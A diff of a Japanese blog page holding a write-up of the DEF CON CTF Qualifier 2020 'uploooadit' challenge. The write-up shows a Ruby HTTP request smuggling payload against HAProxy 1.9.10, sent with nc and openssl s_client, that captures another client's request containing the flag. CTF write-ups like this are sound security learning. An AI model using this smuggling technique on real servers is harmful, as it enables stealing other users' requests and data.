@@ -10,7 +10,7 @@
 
         <meta charset="utf-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <meta name="generator" content="Hugo 0.25.1" />
+        <meta name="generator" content="Hugo 0.76.0-DEV" />
         
 
 
@@ -23,13 +23,7 @@
             
         
 
-        
-
-  <meta name="twitter:card" content="summary"/>
-
-
-
-<meta name="twitter:text:title" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp"/>
+        <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp"/>
 <meta name="twitter:description" content="2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、 welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。 最初の2つはチュートリアルなので割愛して、up"/>
 <meta name="twitter:site" content="@s_tajima"/>
@@ -38,29 +32,14 @@
 <meta property="og:description" content="2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、 welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。 最初の2つはチュートリアルなので割愛して、up" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/" />
+<meta property="article:published_time" content="2020-05-18T23:00:00+09:00" />
+<meta property="article:modified_time" content="2020-05-18T23:00:00+09:00" />
 
-
-
-<meta property="article:published_time" content="2020-05-18T23:00:00&#43;09:00"/>
-<meta property="article:modified_time" content="2020-05-18T23:00:00&#43;09:00"/>
-
-
-
-
-
-
-
-
-
-
-
-        
-<meta itemprop="name" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp">
+        <meta itemprop="name" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp">
 <meta itemprop="description" content="2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、 welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。 最初の2つはチュートリアルなので割愛して、up">
-
-
-<meta itemprop="dateModified" content="2020-05-18T23:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="1234">
+<meta itemprop="datePublished" content="2020-05-18T23:00:00+09:00" />
+<meta itemprop="dateModified" content="2020-05-18T23:00:00+09:00" />
+<meta itemprop="wordCount" content="1256">
 
 
 
@@ -98,14 +77,17 @@
         
         
             
-<script>
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-
-ga('create', 'UA-22927498-5', 'auto');
-ga('send', 'pageview');
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-22927498-5', 'auto');
+	
+	ga('send', 'pageview');
+}
 </script>
 
         
@@ -200,6 +182,10 @@ ga('send', 'pageview');
                     </li>
                 
                     <li>
+                        <a href="https://blog.s-tajima.work/post/"><p>Posts</p></a>
+                    </li>
+                
+                    <li>
                         <a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/"><p>DEF CON CTF Qualifier 2020 uploooadit WriteUp</p></a>
                     </li>
                 
@@ -209,10 +195,6 @@ ga('send', 'pageview');
                 
                     <li>
                         <a href="https://blog.s-tajima.work/post/2019/security-assessment/"><p>セキュリティ診断で確認する項目</p></a>
-                    </li>
-                
-                    <li>
-                        <a href="https://blog.s-tajima.work/post/2018/smart-contract-write-up_en/"><p>CODE BLUE 2018 Smart Contract Hacking Challenge WriteUp (en)</p></a>
                     </li>
                 
             </ul>
@@ -307,30 +289,22 @@ ga('send', 'pageview');
     
 
     <div id="content">
-        
-
-<p>2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、<br />
+        <p>2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、<br>
 welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。</p>
-
 <p>最初の2つはチュートリアルなので割愛して、uploooaditのWriteUpを書きます。</p>
-
 <h1 id="ソースコードを確認">ソースコードを確認</h1>
-
 <ul>
 <li>Flaskで書かれたPythonのWebアプリケーション</li>
 <li>エンドポイントは以下の3つ
-
 <ul>
 <li>GET / &hellip; 空のページです。</li>
 <li>POST /files/ &hellip; X-guidというリクエストヘッダに記載された文字列の通りのパスにファイルを保存します。</li>
 <li>GET /files/ &hellip; POST /files/ でアップロードしたファイルのコンテンツを返します。</li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
 <h1 id="稼働環境を確認">稼働環境を確認</h1>
-
 <p>普通にリクエストを投げてみて、HAProxy + gunicorn/20.0.0の構成ということがわかります。</p>
-
 <pre><code>$ curl -sv https://uploooadit.oooverflow.io/
 .. snip ..
 &lt; HTTP/1.1 204 NO CONTENT
@@ -339,11 +313,8 @@ welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。</
 &lt; Content-Type: text/html; charset=utf-8
 &lt; Via: haproxy
 .. snip ..
-</code></pre>
-
-<p>今度はエラーになるようなリクエストを投げてみて、HAProxyのバージョンは1.9.10ということがわかります。<br />
+</code></pre><p>今度はエラーになるようなリクエストを投げてみて、HAProxyのバージョンは1.9.10ということがわかります。<br>
 <a href="https://www.haproxy.org/download/1.9/src/CHANGELOG">https://www.haproxy.org/download/1.9/src/CHANGELOG</a> を見ると、2019/08/08のリリースと若干古いのが気になります。</p>
-
 <pre><code>$ curl -sv https://uploooadit.oooverflow.io/あ
 &lt; HTTP/1.0 400 Bad request
 &lt; Server: haproxy 1.9.10
@@ -355,41 +326,29 @@ welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。</
 Your browser sent an invalid request.
 &lt;/body&gt;&lt;/html&gt;
 .. snip ..
-</code></pre>
-
-<p>SSRFやHTTP request smugglingあたりができるのではと疑い、
+</code></pre><p>SSRFやHTTP request smugglingあたりができるのではと疑い、
 調べてみると HAProxy の HTTP request smuggling というそのまんまの記事が見つかります。</p>
-
 <ul>
 <li><a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">https://nathandavison.com/blog/haproxy-http-request-smuggling</a></li>
 <li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li>
 </ul>
-
 <p>この時点でこんな仮説をたてました。</p>
-
 <ul>
 <li>フラグが含まれたObjectに対するアクセス、ないしはフラグをアップロードするアクセスが、定常的にリクエストされている。</li>
 <li>HTTP request smugglingによって、そのアクセスの内容を盗み取る必要がある。</li>
 </ul>
-
 <h1 id="ローカルで検証環境の作成">ローカルで検証環境の作成</h1>
-
 <p>適当に立ち上げたEC2上に&hellip;</p>
-
 <ul>
 <li>HAProxyの1.9.10を用意 (ソースコードからコンパイル)</li>
 <li>gunicornを用意 (pipでインストール)</li>
 <li>提供された app.py, store.py を使用 (S3StoreはLocalStoreに切り替え)</li>
 </ul>
-
 <p>という形で環境をつくります。</p>
-
 <p>そして、まずはRubyでこんなPayloadを作成。</p>
-
 <ul>
 <li>payload.rb</li>
 </ul>
-
 <pre><code>payload = &lt;&lt;EOP
 POST /files/ HTTP/1.1\r
 Host: uploooadit.oooverflow.io\r
@@ -401,19 +360,12 @@ test\r
 
 EOP
 print payload 
-</code></pre>
-
-<p>こんな形でトライ&amp; エラーを繰り返せる状態を作ります。</p>
-
+</code></pre><p>こんな形でトライ&amp; エラーを繰り返せる状態を作ります。</p>
 <pre><code>$ ruby payload.rb | nc localhost 1080
-</code></pre>
-
-<p>tcpdumpも使い、パケットを見ながら調整していくと、こんな形でうまくいきそうなことがわかります。</p>
-
+</code></pre><p>tcpdumpも使い、パケットを見ながら調整していくと、こんな形でうまくいきそうなことがわかります。</p>
 <ul>
 <li>payload.rb</li>
 </ul>
-
 <pre><code>payload = &lt;&lt;EOP.chomp
 POST /files/ HTTP/1.1\r
 Host: uploooadit.oooverflow.io\r
@@ -435,27 +387,17 @@ EOP
 
 print payload 
 sleep(10)
-</code></pre>
-
-<ul>
+</code></pre><ul>
 <li>コマンド</li>
 </ul>
-
-<pre><code class="language-bash">$ unbuffer ruby payload.rb | nc localhost 1080
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ unbuffer ruby payload.rb | nc localhost <span style="color:#ae81ff">1080</span>
 $ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
-</code></pre>
-
-<h1 id="実環境でのトライ">実環境でのトライ</h1>
-
-<p>実際の環境はhttpsなので、ncをopenssl s_clientにし、かつ Content-Length も調整していき&hellip;<br />
+</code></pre></div><h1 id="実環境でのトライ">実環境でのトライ</h1>
+<p>実際の環境はhttpsなので、ncをopenssl s_clientにし、かつ Content-Length も調整していき&hellip;<br>
 最終的に以下のようなコマンドにてリクエストを盗み見ることに成功。</p>
-
-<pre><code class="language-bash">$ unbuffer ruby payload.rb | openssl s_client -connect uploooadit.oooverflow.io:443
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ unbuffer ruby payload.rb | openssl s_client -connect uploooadit.oooverflow.io:443
 $ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
-</code></pre>
-
-<p>リクエストのBodyにFLAGがありました。</p>
-
+</code></pre></div><p>リクエストのBodyにFLAGがありました。</p>
 <pre><code>tesPOST /files/ HTTP/1.1
 Host: 127.0.0.1:8080
 User-Agent: invoker
@@ -468,10 +410,8 @@ X-Forwarded-For: 127.0.0.1
 
 Congratulations!
 OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
-</code></pre>
-
-<p>以上、久しぶりに参加したCTFのWriteUpでした。<br />
-いつもCTFは遊び参加で数問見てみて終わりみたいになるんだけど、<br />
+</code></pre><p>以上、久しぶりに参加したCTFのWriteUpでした。<br>
+いつもCTFは遊び参加で数問見てみて終わりみたいになるんだけど、<br>
 そろそろチームとか組んでがっつり時間確保して上位に入るのを目指すような参加をしたい。</p>
 
     </div>
@@ -679,6 +619,20 @@ OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest t
                     <li>
                         <article>
                             <header>
+                                <h3><a href="https://blog.s-tajima.work/post/">Posts</a></h3>
+                                
+                                    
+                                
+                                <time class="published" datetime=
+                                    '2020-07-05'>
+                                    July 5, 2020</time>
+                            </header>
+                        </article>
+                    </li>
+                
+                    <li>
+                        <article>
+                            <header>
                                 <h3><a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/">DEF CON CTF Qualifier 2020 uploooadit WriteUp</a></h3>
                                 
                                     
@@ -718,20 +672,6 @@ OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest t
                         </article>
                     </li>
                 
-                    <li>
-                        <article>
-                            <header>
-                                <h3><a href="https://blog.s-tajima.work/post/2018/smart-contract-write-up_en/">CODE BLUE 2018 Smart Contract Hacking Challenge WriteUp (en)</a></h3>
-                                
-                                    
-                                
-                                <time class="published" datetime=
-                                    '2018-11-25'>
-                                    November 25, 2018</time>
-                            </header>
-                        </article>
-                    </li>
-                
 
                 
                     <li>
@@ -761,15 +701,6 @@ OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest t
                     
                 
 
-                
-                    <li>
-                        <article>
-                            <header>
-                                <a href="/categories//"></a>
-                                <span style="float:right;">6</span>
-                            </header>
-                        </article>
-                    </li>
                 
                     <li>
                         <article>
